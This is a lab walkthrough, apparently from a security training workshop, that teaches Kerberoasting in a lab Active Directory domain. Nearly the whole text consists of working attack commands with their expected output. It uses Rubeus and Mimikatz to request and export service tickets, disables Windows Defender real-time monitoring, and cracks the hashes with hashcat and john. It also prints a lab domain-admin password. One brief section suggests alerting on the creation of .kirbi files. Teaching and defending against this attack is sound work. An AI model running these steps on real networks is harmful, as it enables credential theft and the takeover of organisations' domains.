# Common Kerberoasting

Kerberoasting is an attack that takes advantage of the fact that many organizations do not use Managed Service Accounts in AD. Rather, they assign a Service Principal Name (SPN), often referred to as a "spin", to a general AD account. This effectively makes a general AD user account a service account. However, it leaves the account vulnerable to the kerberoasting attack.

Any domain account can request and receive a Kerberos ticket for an account that is used as a service account from the ticket granting sevice (TGS). The trick here is that these tickets are encrypted using the NTLM hash of the service account. A kerberoasting attack takes place when a domain user requests and receives such a ticket in memory, dumps the ticket to disk, and then cracks the NTLM hash to then obtain the cleartext NTLM password.

That last bit makes judging the effectiveness of kerberoasting quite difficult, as the final step of the attack often happens "offline," meaning outisde the network environment. Though you may detect that a kerberoasting attack was under way, you will not have access to any forensic data that denotes the success or failure of the final stage of the attack. Was the TA able to crack the hash? You can make assumptions based on account use, but you won't know for sure.

Enough of the preamble, let's get to it!

## Kerberoasting via Rubeus

We'll begin by using Rubeus, a commonly-used tool that fully automated the Kerberoasting process. This attack couldn't be simpler than using Rubeus -- Let's see why!

At this point you should still be RDP'd to TWORIVERS from the attack machine. On TWORIVERS, do the following:

1. Use RunAs to run a PowerShell prompt as `WHEEL\Administrator`:
    
    1. Start menu -> type `run` -> click "Run (App)" -> enter:
    
    ```powershell
    runas /user:wheel\Administrator powershell.exe
    ```
    
    - You will be prompted to `Enter the password for wheel\Administrator:`, which is:
        
        ```
        12qwaszx!@QWASZX
        ```
    
    A new PowerShell prompt with the title `Administrator: powershell.exe (running as wheel\Administrator` will open. Good!

    Now that we are running PowerShell as a domain admin, let's enumerate AD!

1. Extract Rubeus:

    ```powershell
    cd C:\Users\Public\Desktop\LAB_FILES\assets\
    expand-archive .\Rubeus-alt.zip
    cd .\Rubeus-alt
    ```

    As a note, [Rubeus is provided as source code](https://for528.com/rubeus). Some TAs will use [a well-known pre-compiled version in their attacks](https://for528.com/ghostpack-compiled), while others will compile the tool from source. The `Rubeus-alt.zip` archive above is actually the pre-compiled version from [here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/dotnet%20v4.5%20compiled%20binaries/Rubeus.exe).

1. Perform a Kerberoasting attack using Rubeus:
    
    ```powershell
    ./rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\Perflogs\hashes.txt
    ```

    Above we used the `/format:hashcat` option to tell Rubeus to output hashes in hashcat format. [The project's Roast.cs source file](https://github.com/GhostPack/Rubeus/blob/659d98d8582573c2ff8c3a68ee0b02d7d5f8387d/Rubeus/lib/Roast.cs#L207) accepts either `john` or `hashcat` as the output options. Many TAs like to use [haschat](https://for528.com/hashcat) because of its strong support for GPU cracking.

    Expected output:
    
    ```
    ./rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\Perflogs\hashes.txt

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v2.2.0


    [*] Action: Kerberoasting

    [*] NOTICE: AES hashes will be returned for AES-enabled accounts.
    [*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

    [*] Target Domain          : wheel.co
    [*] Searching path 'LDAP://tarvalon.wheel.co/DC=wheel,DC=co' for '(&(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))(admincount=1))'

    [*] Total kerberoastable users : 1


    [*] SamAccountName         : svc-file
    [*] DistinguishedName      : CN=svc-file,CN=Users,DC=wheel,DC=co
    [*] ServicePrincipalName   : HOST/shadarlogoth.wheel.co
    [*] PwdLastSet             : 8/7/2023 2:08:41 AM
    [*] Supported ETypes       : RC4_HMAC_DEFAULT
    [*] Hash written to C:\Perflogs\hashes.txt

    [*] Roasted hashes written to : C:\Perflogs\hashes.txt
    PS C:\Users\Public\Desktop\LAB_FILES\assets\Rubeus-alt>
    ```
    
    So far, so good! You now have a `hashes.txt` file at `C:\Perflogs\hashes.txt` that includes the kerberoastable hashes. Notice that we have identified that the `svc-file` account has a SPN of `HOST/shadarlogoth.wheel.co`. Also note that the encryption support is RC4, which is insecure and exactly what we want!

    __Though we will not be covering the process in a step-by-step fashion, we will show you how these hashes could be cracked if we have time after the primary portions of our workshop have been completed.__

## Kerberoasting via Mimikatz

Next we'll be usin Mimikatz to perform a Kerberoasting attack.

To begin, you'll be using the same elevated PowerShell prompt via the `WHEEL\Administrator` account. If you closed the window, simply follow step #1 in the [Kerberoasting via Rubeus](#kerberoasting-via-rubeus) section above, then follow the steps below.

Though Rubeus automated the processing of Kerberoasting from start to finish, Mimikatz can be used with a bit more coaxing. Since lower-skilled TAs such as ransomware actors depend heavily on both of these tools, we'll now review an example method for Kerberoasting via Mimikatz.

We'll be using a bit of PowerShell to identify potentially susceptible SPNs and then to 

1. In your `WHEEL\Administrator` PowerShell prompt, install the Remote Server Administration Tools for Active Direcotry (RSAT-AD) by running:

    ```powershell
    Install-WindowsFeature -Name "RSAT-AD-PowerShell" -IncludeAllSubFeature
    ```

1. Next, run the following to identify potentially susceptible accounts:

    ```powershell
    Get-ADUser -filter * -Properties ServicePrincipalName | Select SamAccountName, ServicePrincipalName | where {$_.ServicePrincipalName -ne $null} | fl
    ```

    Expected output:
    
    ```powershell
    SamAccountName       : krbtgt
    ServicePrincipalName : {kadmin/changepw}

    SamAccountName       : svc-file
    ServicePrincipalName : {HOST/DRAGONMOUNT.wheel.co}
    ```

    Above we can see that the `svc-file` account has a SPN of `HOST/DRAGONMOUNT.wheel.co`. Great! We will now use PS to pull a Kerberos ticket for this account into memory.

1. Run the following to obtain a Kerberos ticket for the susceptible SPN:

    ```powershell
    Add-Type -AssemblyName System.IdentityModel
    ```
    
    ```powershell
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HOST/DRAGONMOUNT.wheel.co"
    ```

    Expected output:
    
    ```powershell
    Id                   : uuid-862b3890-a138-4061-96ac-8589821807b8-2
    SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
    ValidFrom            : 8/7/2023 6:41:19 PM
    ValidTo              : 8/8/2023 4:28:46 AM
    ServicePrincipalName : HOST/DRAGONMOUNT.wheel.co
    SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
    ```

    Wonderful! If you see something similar to the above output, this means that you now have a Kerberos ticket for the `HOST/DRAGONMOUNT.wheel.co` SPN in memory.
    
    We will now **use Mimikatz to dump this ticket to disk.**

    _NOTE:_ You should already have 1) disabled Windows Defender and 2) extracted Mimikatz. If not, make sure to disable WD extract Mimikatz now:
    
    ```powershell
    Set-MpPreference -DisableRealtimeMonitoring 1
    ```
    
    ```powershell
    cd c:\Users\Public\Desktop\LAB_FILES\assets\
    expand-archive ./mimikatz_trunk.zip
    ```

1. Run mimikatz meow:
    
    ```powershell
    cd c:\Users\Public\Desktop\LAB_FILES\assets\mimikatz_trunk\x64\
    .\mimikatz.exe
    ```
   
1. At the Mimikatz prompt (`mimikatz #`), run the following commands:

    ```
    privilege::debug
    kerberos::list /export
    ```

    Expected output:
    
    ```
    [00000000] - 0x00000012 - aes256_hmac
       Start/End/MaxRenew: 8/7/2023 6:38:12 PM ; 8/8/2023 4:28:46 AM ; 8/14/2023 6:28:46 PM
       Server Name       : krbtgt/WHEEL.CO @ WHEEL.CO
       Client Name       : Administrator @ WHEEL.CO
       Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
       * Saved to file     : 0-60a10000-Administrator@krbtgt~WHEEL.CO-WHEEL.CO.kirbi

    [00000001] - 0x00000012 - aes256_hmac
       Start/End/MaxRenew: 8/7/2023 6:28:46 PM ; 8/8/2023 4:28:46 AM ; 8/14/2023 6:28:46 PM
       Server Name       : krbtgt/WHEEL.CO @ WHEEL.CO
       Client Name       : Administrator @ WHEEL.CO
       Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
       * Saved to file     : 1-40e10000-Administrator@krbtgt~WHEEL.CO-WHEEL.CO.kirbi

    [00000002] - 0x00000017 - rc4_hmac_nt
       Start/End/MaxRenew: 8/7/2023 6:41:19 PM ; 8/8/2023 4:28:46 AM ; 8/14/2023 6:28:46 PM
       Server Name       : HOST/DRAGONMOUNT.wheel.co @ WHEEL.CO
       Client Name       : Administrator @ WHEEL.CO
       Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
       * Saved to file     : 2-40a10000-Administrator@HOST~DRAGONMOUNT.wheel.co-WHEEL.CO.kirbi

    [00000003] - 0x00000012 - aes256_hmac
       Start/End/MaxRenew: 8/7/2023 6:38:12 PM ; 8/8/2023 4:28:46 AM ; 8/14/2023 6:28:46 PM
       Server Name       : ldap/tarvalon.wheel.co/wheel.co @ WHEEL.CO
       Client Name       : Administrator @ WHEEL.CO
       Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
       * Saved to file     : 3-40a50000-Administrator@ldap~tarvalon.wheel.co~wheel.co-WHEEL.CO.kirbi
    ```

    Notice that we have just dumped multiple `.kirbi` files to disk. These files are a Mimikatz-specific file type. 

    The next step in this attack would be to:
        
    1. Exfiltrate the `.kirbi` files
    
    1. Attempt to crack the passwords contained within them
        
        - This would normally occur out of the victim network. For example, the TA in this case might copy the `.kirbi` files out via RDP to the `Lighteater` host and then attempt to crack them there.

### A note about kirbi files

The Mimikatz code base uses a hardcoded file suffix of `.kirbi` when it saves tickets to disk. You can find the relevant lines of code at the following links:
    
- [A global constant for the file extension in line 40 of globals.h](https://github.com/gentilkiwi/mimikatz/blob/82cb7eb2370d63eefc0c0293a9778a0d7e8466d8/inc/globals.h#L40):

    `#define MIMIKATZ_KERBEROS_EXT L"kirbi"`

- [The global constant being used for file creation](https://github.com/gentilkiwi/mimikatz/blob/e10bde5b16b747dc09ca5146f93f2beaf74dd17a/mimikatz/modules/kerberos/kuhl_m_kerberos.c#L242):
    
    `if(filename = kuhl_m_kerberos_generateFileName(i, &pKerbCacheResponse->Tickets[i], MIMIKATZ_KERBEROS_EXT))`

This serves as a great example as to why being able to review source code can prove useful in generating your detection and mitigation methods! Given this finding, you should set up alerts for the creation of any file with a `.kirbi` extension.
- Sure, threat actors _could_ compile their own versions of Mimikatz with custom file suffixes set, but this is not done commonly by TAs such as ransomware affiliates.

**Review the extracted kirbi files**

1. Exit Mimikatz:
    
    ```
    mimikatz # exit
    ```

1. Review the dumped `.kirbi` files that you just obtained:
    
    ```powershell
    ls *.kirbi
    ```
    
    Expected output:
    
    ```powershell
        Directory: C:\Users\Public\Desktop\LAB_FILES\assets\mimikatz_trunk\x64

    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a----          8/7/2023   6:55 PM           1440 0-60a10000-Administrator@krbtgt~WHEEL.CO-WHEEL.CO.kirbi
    -a----          8/7/2023   6:55 PM           1472 1-40e10000-Administrator@krbtgt~WHEEL.CO-WHEEL.CO.kirbi
    -a----          8/7/2023   6:55 PM           1634 2-40a10000-Administrator@HOST~DRAGONMOUNT.wheel.co-WHEEL.CO.kirbi
    -a----          8/7/2023   6:55 PM           1644 3-40a50000-Administrator@ldap~tarvalon.wheel.co~wheel.co-WHEEL.CO.kirbi
    ```
    
Congrats! You've now dumped your in-memory tickets to disk. Your next step would be to crack the kirbi files.

## BONUS: Cracking Methods

### hashcat

Ryan will show this method on his machine :).

```
$ hashcat -m 13100 hashes.txt super_secure_passwords.txt 
```

### john

If you want to use `john` to do the cracking, you can do see using a method similar to the following:

```
kirbi2john.py 2-40a10000-Administrator@HOST~DRAGONMOUNT.wheel.co-WHEEL.CO.kirbi > svc-file_krb5tgs.txt

john --format:krb5tgs hashes.txt --wordlist=./super_secure_passwords.txt
```

Above we run [kirbi2john.py](https://github.com/nidem/kerberoast/blob/master/kirbi2john.py) to convert the kirbi files to a format that `john` can use. We then run `john` and provide an example wordlist (like the classic `rockyou.txt` password dump) along with our converted hashes file.

### tgsrepcrack.py

[tgsrepcrack.py](https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py) is a thing, but... just use hashcat. In fact, the tool tells you as much, as the following comes straight from the script!

```
print('''

    USE HASHCAT, IT'S HELLA FASTER!!

''')
```
